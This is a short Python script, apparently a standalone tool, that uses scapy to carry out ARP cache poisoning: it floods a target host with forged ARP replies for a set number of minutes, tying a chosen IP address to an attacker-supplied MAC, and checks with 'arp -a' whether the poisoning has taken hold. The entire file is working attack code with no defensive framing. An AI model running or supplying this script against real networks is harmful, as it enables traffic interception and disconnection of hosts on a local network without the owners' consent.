from scapy.all import *
import time
from threading import Thread
from colorama import Fore, Back, Style
class test_class:
         def __init__(self,attack_ip,victim_mac):
            self.victim_mac=victim_mac
            self.attack_ip=attack_ip
         def testspoof(self):
          cmd = 'arp -a '+self.attack_ip
          returned_output = subprocess.check_output((cmd),shell=True,stderr=subprocess.STDOUT)
          print(returned_output)
          output=returned_output.decode()
          output=output.split('[')[0]
          output=output.split("at", 1)[-1]
          if output==self.victim_mac:
           return ("Yes")   
          else:
           return ("No")    

class arpspoof:
    
    def __init__(self,box_ip,attack_ip,victim_mac,time):
        self.box_ip=box_ip
        self.victim_mac=victim_mac
        self.attack_ip=attack_ip
        self.time=time
       
    def make(self):
        print(Fore.GREEN+"The ejection has started!")
        second=int(self.time)*int(60)
        fin = int(time.time()) + int(second)
        test=int(time.time())+int(second)/10
        while time.time()<fin:
            packet=send(ARP(op=2,pdst=self.box_ip, psrc=self.attack_ip, hwsrc=self.victim_mac),verbose=0)
            if time.time()>test:
             b=test_class(self.attack_ip,self.victim_mac)
             test_arp=b.testspoof()
             if test_arp == "No":
                print(Fore.RED+"The attack is not achieved")
                break
        print(Fore.GREEN+"The ejection is finished!") 
    